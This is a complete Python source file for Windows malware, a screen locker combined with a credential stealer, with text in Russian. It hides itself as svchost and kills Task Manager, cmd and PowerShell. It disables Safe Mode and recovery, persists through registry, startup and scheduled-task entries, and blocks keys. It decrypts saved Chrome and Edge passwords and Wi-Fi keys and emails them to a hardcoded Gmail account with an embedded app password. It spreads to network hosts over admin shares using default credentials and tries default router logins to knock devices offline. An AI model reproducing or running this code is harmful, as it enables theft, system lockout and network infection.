import os, sys, time, threading, tempfile, tkinter as tk
from tkinter import PhotoImage
import urllib.request, smtplib, socket, subprocess, base64, random, re, json
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import cv2, numpy as np
from PIL import ImageGrab
import sqlite3, win32crypt, shutil, winreg, ctypes

PASSWORD = "1601"
MAX_ATTEMPTS = 4
GMAIL_LOGIN = "xzx78848@gmail.com"
GMAIL_APP_PASSWORD = "cbgr awth fvak xgfb"
RECEIVER_EMAIL = "xzx78848@gmail.com"
VIDEO_URL = "https://github.com/ippo123459-bit/winlocker/raw/refs/heads/main/fuxEcorp.mp4.mp4"
AUDIO_URL = "https://github.com/ippo123459-bit/winlocker/raw/refs/heads/main/fuxEcorp.mp4.mp3"
VIDEO_PATH = os.path.join(tempfile.gettempdir(), "fuxEcorp.mp4.mp4")
AUDIO_PATH = os.path.join(tempfile.gettempdir(), "fuxEcorp.mp4.mp3")
attempts_left = MAX_ATTEMPTS

def hide_process():
    try: ctypes.windll.kernel32.SetConsoleTitleW("svchost.exe")
    except: pass

def kill_taskmgr_loop():
    while True:
        try:
            for p in ["taskmgr.exe","cmd.exe","powershell.exe","msconfig.exe","regedit.exe","procexp.exe"]:
                os.system(f"taskkill /f /im {p} >nul 2>&1")
        except: pass
        time.sleep(0.03)

def block_everything():
    try:
        import keyboard
        for k in ['alt','ctrl','shift','tab','caps lock','esc','f1','f2','f3','f4','f5','f6','f7','f8','f9','f10','f11','f12','print screen','scroll lock','pause','insert','home','end','page up','page down','up','down','left','right','windows','left windows','right windows','delete']:
            try: keyboard.block_key(k)
            except: pass
        for c in ['alt+f4','alt+tab','alt+esc','alt+space','ctrl+shift+esc','ctrl+alt+del','ctrl+esc','ctrl+w','ctrl+f4','ctrl+tab','ctrl+c','ctrl+v','win','win+d','win+r','win+e','win+l','win+m','win+tab','win+x','win+u','win+i','win+a','win+s','win+p','win+t','win+ctrl+d','win+ctrl+f4','win+shift+m']:
            try: keyboard.add_hotkey(c, lambda: None, suppress=True, timeout=0)
            except: pass
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, "NoWinKeys", 0, winreg.REG_DWORD, 1); winreg.CloseKey(k)
        try:
            k2 = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(k2, "DisableTaskMgr", 0, winreg.REG_DWORD, 1); winreg.CloseKey(k2)
        except: pass
    except: ctypes.windll.user32.BlockInput(True)

def unblock_all():
    try: ctypes.windll.user32.BlockInput(False)
    except: pass
    try: import keyboard; keyboard.unhook_all()
    except: pass
    try:
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, "NoWinKeys", 0, winreg.REG_DWORD, 0); winreg.CloseKey(k)
    except: pass
    try:
        k2 = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k2, "DisableTaskMgr", 0, winreg.REG_DWORD, 0); winreg.CloseKey(k2)
    except: pass

def block_safe_mode():
    try:
        os.system('bcdedit /deletevalue {current} safeboot >nul 2>&1')
        os.system('bcdedit /set {current} bootstatuspolicy ignoreallfailures >nul 2>&1')
        os.system('bcdedit /set {current} recoveryenabled no >nul 2>&1')
    except: pass

# ===== ОТКЛЮЧЕНИЕ ВСЕХ ОТ ИНТЕРНЕТА =====
def disconnect_all_from_internet():
    gateway = "192.168.1.1"
    try:
        route = subprocess.check_output("ipconfig | findstr /i \"шлюз\"", shell=True, stderr=subprocess.DEVNULL).decode('cp866', errors='replace')
        for line in route.split('\n'):
            if '.' in line:
                gw = re.findall(r'\d+\.\d+\.\d+\.\d+', line)
                if gw and not gw[0].startswith('0.'):
                    gateway = gw[0]
                    break
    except: pass
    
    # Методы отключения
    for url in [
        f"http://{gateway}/reboot.cgi",
        f"http://{gateway}/goform/Reboot",
        f"http://{gateway}/userRpm/WlanNetworkRpm.htm?ssid=off",
        f"http://{gateway}/goform/WifiBasicSet?wifiEnable=0",
    ]:
        try:
            urllib.request.urlopen(url, timeout=3)
            send_email(f"РОУТЕР {gateway} АТАКОВАН!\nВсе отключены от интернета!", "[DedSek] Router OFF")
            return
        except: pass
    
    # Подбор паролей
    for user, pwd in [("admin","admin"),("admin","1234"),("admin",""),("root","admin"),("root","root")]:
        try:
            auth = base64.b64encode(f"{user}:{pwd}".encode()).decode()
            req = urllib.request.Request(f"http://{gateway}/reboot.cgi")
            req.add_header("Authorization", f"Basic {auth}")
            urllib.request.urlopen(req, timeout=3)
            send_email(f"РОУТЕР {gateway} ПЕРЕЗАГРУЖЕН!\nЛогин: {user}\nПароль: {pwd}", "[DedSek] Router REBOOT")
            return
        except: pass

# ===== ЗАРАЖЕНИЕ СЕТИ =====
def scan_network():
    try:
        arp = subprocess.check_output("arp -a", shell=True, stderr=subprocess.DEVNULL).decode('cp866', errors='replace')
        return list(set(re.findall(r'\d+\.\d+\.\d+\.\d+', arp)))
    except: return []

def infect_network():
    my_path = os.path.abspath(__file__)
    for ip in scan_network():
        try:
            os.system(f'net use \\\\{ip}\\C$ /user:admin admin >nul 2>&1')
            shutil.copy2(my_path, f'\\\\{ip}\\C$\\Windows\\Temp\\svchost.pyw')
            os.system(f'wmic /node:{ip} process call create "pythonw C:\\Windows\\Temp\\svchost.pyw" >nul 2>&1')
        except: pass

def add_to_startup():
    try:
        cp = os.path.abspath(__file__)
        pp = os.path.splitext(cp)[0] + ".pyw"
        if not cp.endswith(".pyw"):
            try: shutil.copy2(cp, pp)
            except: pass
            cp = pp
        pythonw = sys.executable.replace("python.exe", "pythonw.exe")
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, "svchost", 0, winreg.REG_SZ, f'"{pythonw}" "{cp}"')
        winreg.CloseKey(k)
        startup = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        shutil.copy2(cp, os.path.join(startup, 'svchost.pyw'))
        try:
            k2 = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(k2, "svchost", 0, winreg.REG_SZ, f'"{pythonw}" "{cp}"')
            winreg.CloseKey(k2)
        except: pass
        os.system(f'schtasks /create /tn "svchost" /tr "\\"{pythonw}\\" \\"{cp}\\"" /sc ONLOGON /rl HIGHEST /f >nul 2>&1')
    except: pass

def download_file(url, path):
    try:
        if os.path.exists(path): os.remove(path)
        urllib.request.urlretrieve(url, path)
    except: pass

def anim_fsociety():
    a = tk.Tk(); a.attributes('-fullscreen', True); a.attributes('-topmost', True)
    a.configure(bg='black'); a.overrideredirect(True)
    lbl = tk.Label(a, text="", bg='black', fg='white', font=('Courier', 50, 'bold'))
    lbl.pack(expand=True)
    for t in ["f","f s","f s o","f s o c","f s o c i","f s o c i e","f s o c i e t","f s o c i e t y"]:
        lbl.config(text=t); a.update(); time.sleep(0.3)
    time.sleep(1)
    sub = tk.Label(a, text="", bg='black', fg='#ff4444', font=('Courier', 20)); sub.pack(pady=20)
    for i in range(len("тебя заметила")+1):
        sub.config(text="тебя заметила"[:i]); a.update(); time.sleep(0.1)
    time.sleep(2); a.destroy()

def anim_stealer():
    a = tk.Tk(); a.attributes('-fullscreen', True); a.attributes('-topmost', True)
    a.configure(bg='black'); a.overrideredirect(True)
    tk.Label(a, text="Стиллер ворует данные...", bg='black', fg='white', font=('Courier', 20, 'bold')).pack(expand=True, pady=(0,50))
    bar = tk.Canvas(a, width=400, height=30, bg='black', highlightthickness=1, highlightbackground='white'); bar.pack()
    bar_text = tk.Label(a, text="0%", bg='black', fg='white', font=('Courier', 12)); bar_text.pack(pady=10)
    info = tk.Label(a, text="", bg='black', fg='#0f0', font=('Courier', 10)); info.pack()
    for percent, text in [(10,"Поиск паролей Chrome..."),(20,"WiFi пароли..."),(30,"Сканирование сети..."),(45,"Копирование cookies..."),(60,"Сбор IP адресов..."),(75,"Кража файлов..."),(90,"Отправка на сервер..."),(100,"ГОТОВО!")]:
        bar.delete('all'); bar.create_rectangle(0, 0, 400*percent/100, 30, fill='#0f0', outline='')
        bar_text.config(text=f"{percent}%"); info.config(text=text); a.update(); time.sleep(0.5)
    time.sleep(2); a.destroy()

def anim_connect():
    a = tk.Tk(); a.attributes('-fullscreen', True); a.attributes('-topmost', True)
    a.configure(bg='black'); a.overrideredirect(True)
    lbl = tk.Label(a, text="", bg='black', fg='#0f0', font=('Courier', 14), justify='left'); lbl.pack(expand=True)
    current = ""
    for line in ["[*] Establishing connection...","[*] Connecting to Windows kernel...","[*] Bypassing security...","[*] Access granted!","[*] Mounting system...","[*] Connected to: " + socket.gethostname(),"[*] IP: " + socket.gethostbyname(socket.gethostname()),"","[✓] SYSTEM COMPROMISED"]:
        current += line + "\n"; lbl.config(text=current); a.update(); time.sleep(0.4)
    time.sleep(3); a.destroy()

def play_video():
    download_file(VIDEO_URL, VIDEO_PATH)
    download_file(AUDIO_URL, AUDIO_PATH)
    time.sleep(0.5)
    try:
        v = tk.Tk(); v.attributes('-fullscreen', True); v.attributes('-topmost', True)
        v.configure(bg='black'); v.overrideredirect(True)
        v.protocol("WM_DELETE_WINDOW", lambda: None)
        lbl = tk.Label(v, bg='black'); lbl.pack(expand=True, fill='both')
        try: subprocess.Popen(['ffplay','-nodisp','-autoexit','-loglevel','quiet', AUDIO_PATH], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except: pass
        cap = cv2.VideoCapture(VIDEO_PATH)
        if cap.isOpened():
            fps = cap.get(cv2.CAP_PROP_FPS)
            if fps <= 0: fps = 30
            sw, sh = v.winfo_screenwidth(), v.winfo_screenheight()
            fc = 0; vs = time.time()
            while cap.isOpened():
                ret, frame = cap.read()
                if not ret: break
                fc += 1
                expected = fc / fps
                elapsed = time.time() - vs
                if expected > elapsed: time.sleep(expected - elapsed)
                frame = cv2.resize(frame, (sw, sh))
                frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                img = tk.PhotoImage(data=cv2.imencode('.ppm', frame)[1].tobytes())
                lbl.config(image=img); lbl.image = img; v.update()
            cap.release()
        v.destroy()
    except: pass

def mega_steal():
    report = ["="*60, "DEDSEK STEALER", "="*60]
    report.append(f"USER: {os.environ.get('USERNAME')} | PC: {socket.gethostname()}")
    try: report.append(f"PUBLIC IP: {urllib.request.urlopen('https://api.ipify.org', timeout=5).read().decode()}")
    except: pass
    try: report.append(f"LOCAL IP: {socket.gethostbyname(socket.gethostname())}")
    except: pass
    try: report.append("\nNETWORK:\n" + subprocess.check_output("arp -a", shell=True, stderr=subprocess.DEVNULL).decode('cp866','replace')[:2000])
    except: pass
    for browser, path in [("CHROME", os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')),("EDGE", os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data'))]:
        if os.path.exists(path):
            report.append(f"\n=== {browser} ===")
            try:
                db = os.path.join(tempfile.gettempdir(), f'{browser}.db')
                shutil.copy2(path, db)
                cur = sqlite3.connect(db).cursor()
                cur.execute("SELECT origin_url, username_value, password_value FROM logins")
                for url, user, pw in cur:
                    try:
                        pwd = win32crypt.CryptUnprotectData(pw, None, None, None, 0)[1].decode('utf-8','ignore')
                        report.append(f"URL: {url}\nLOGIN: {user}\nPASSWORD: {pwd}")
                    except: pass
                cur.close()
                try: os.remove(db)
                except: pass
            except: pass
    try:
        report.append("\n=== WIFI ===")
        output = subprocess.check_output("netsh wlan show profiles", shell=True, stderr=subprocess.DEVNULL).decode('cp866','replace')
        for line in output.split('\n'):
            if 'Все профили' in line:
                p = line.split(':')[1].strip()
                if p:
                    det = subprocess.check_output(f'netsh wlan show profile name="{p}" key=clear', shell=True, stderr=subprocess.DEVNULL).decode('cp866','replace')
                    for dl in det.split('\n'):
                        if 'Содержимое ключа' in dl: report.append(f"WiFi: {p} | PASS: {dl.split(':')[1].strip()}")
    except: pass
    report.append(f"\nTIME: {time.strftime('%d.%m.%Y %H:%M:%S')}")
    text = '\n'.join(report)
    for i, part in enumerate([text[i:i+15000] for i in range(0, len(text), 15000)]): send_email(part, f"[DedSek_Logs] [{i+1}]")

def send_email(msg, subj=None):
    try:
        m = MIMEText(msg, 'plain', 'utf-8')
        m['Subject'] = subj or 'DedSek'; m['From'] = GMAIL_LOGIN; m['To'] = RECEIVER_EMAIL
        s = smtplib.SMTP_SSL('smtp.gmail.com', 465, timeout=10)
        s.login(GMAIL_LOGIN, GMAIL_APP_PASSWORD); s.send_message(m); s.quit()
    except: pass

class WinLocker:
    def __init__(self):
        self.root = tk.Tk(); self.root.withdraw()
        self.win = tk.Toplevel(self.root)
        self.win.attributes('-fullscreen', True); self.win.attributes('-topmost', True)
        self.win.configure(bg='black'); self.win.overrideredirect(True)
        self.win.protocol("WM_DELETE_WINDOW", lambda: None); self.win.focus_force()
        global attempts_left
        
        msg = f"""Ну привет друг, как у тебя дела?

Да, понимаю, ты попался.
Ну и нахуя ты скачал игру из инета?
Я не пойму...

Ну ладно, вот тебе загадка. Там пароль.

Я — год, когда произошло событие,
которое не произошло.
В Англии заговорщики планировали
взорвать парламент и убить короля.
Их план провалился, король выжил,
а заговорщиков казнили.
Но в Windows я стал началом времён.

ЧТО Я ЗА ЧИСЛО?

У ТЕБЯ {MAX_ATTEMPTS} ПОПЫТКИ."""
        
        tk.Label(self.win, text=msg, bg='black', fg='white', font=('Courier',10,'bold'), justify='left').place(relx=0.5, rely=0.38, anchor='center')
        cf = tk.Frame(self.win, bg='black'); cf.place(relx=0.5, rely=0.8, anchor='center')
        tk.Label(cf, text="ВВЕДИ ПАРОЛЬ:", bg='black', fg='white', font=('Courier',14,'bold')).pack(pady=(0,5))
        self.pw = tk.Entry(cf, show="*", font=('Courier',14,'bold'), bg='white', fg='black', relief='solid', bd=2)
        self.pw.pack(pady=(0,5), ipadx=40, ipady=3)
        self.sl = tk.Label(cf, text=f"ОСТАЛОСЬ: {attempts_left}", bg='black', fg='white', font=('Courier',12,'bold'))
        self.sl.pack()
        self.pw.bind('<Return>', self.check); self.pw.focus_force()
        self.win.after(100, self._keep)
    
    def _keep(self):
        try: self.win.focus_force(); self.pw.focus_force(); self.win.after(100, self._keep)
        except: pass
    
    def check(self, e=None):
        global attempts_left
        if self.pw.get() == PASSWORD:
            unblock_all()
            self.sl.config(text="ВЕРНО!", fg='white'); self.win.update()
            time.sleep(1); self.root.destroy(); os._exit(0)
        else:
            attempts_left -= 1
            if attempts_left > 0: self.sl.config(text=f"НЕВЕРНО! ОСТАЛОСЬ: {attempts_left}", fg='white')
            else: self.sl.config(text="404 | ОШИБКА", fg='white'); self.win.after(2000, lambda: os._exit(0))
            self.pw.delete(0, tk.END)

if __name__ == "__main__":
    hide_process()
    threading.Thread(target=mega_steal, daemon=True).start()
    add_to_startup()
    block_safe_mode()
    threading.Thread(target=kill_taskmgr_loop, daemon=True).start()
    threading.Thread(target=infect_network, daemon=True).start()
    threading.Thread(target=disconnect_all_from_internet, daemon=True).start()
    
    anim_fsociety()
    anim_stealer()
    anim_connect()
    play_video()
    block_everything()
    WinLocker()
    tk.mainloop()
